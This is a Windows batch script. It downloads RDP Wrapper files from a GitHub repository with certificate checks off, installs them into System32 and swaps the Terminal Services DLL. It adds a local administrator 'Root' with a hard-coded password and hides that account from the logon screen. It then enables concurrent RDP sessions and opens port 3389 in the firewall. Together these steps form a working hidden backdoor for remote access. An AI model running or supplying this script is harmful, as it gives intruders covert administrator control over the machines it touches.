@echo off

sc stop UmRdpService
sc stop TermService
sc stop SessionEnv
ping -n 3 127.0.0.1

curl -k -L -o "%~dp0default0" "https://github.com/jecoma/basco/raw/refs/heads/main/rdpwrap/rdpwrap.dll"
curl -k -L -o "%~dp0default1" "https://github.com/jecoma/basco/raw/refs/heads/main/rdpwrap/rdpwrap.ini"
copy /Y "%~dp0default0" "%windir%\System32\rdpwrap.dll"
copy /Y "%~dp0default0" "%windir%\System32\rdpwrap.ini"

taskkill /F /IM svchost.exe /FI "MODULES eq termsrv.dll"

net user "Root" "123qweASD!@#" /ADD && net localgroup Administrators Root /ADD
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Root /t REG_DWORD /d 0 /f

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 3 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\system32\rdpwrap.dll" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TermService" /v Start /t REG_DWORD /d 2 /f

netsh advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp localport=3389 profile=any action=allow

sc start SessionEnv
sc start TermService
sc start UmRdpService
ping -n 3 127.0.0.1
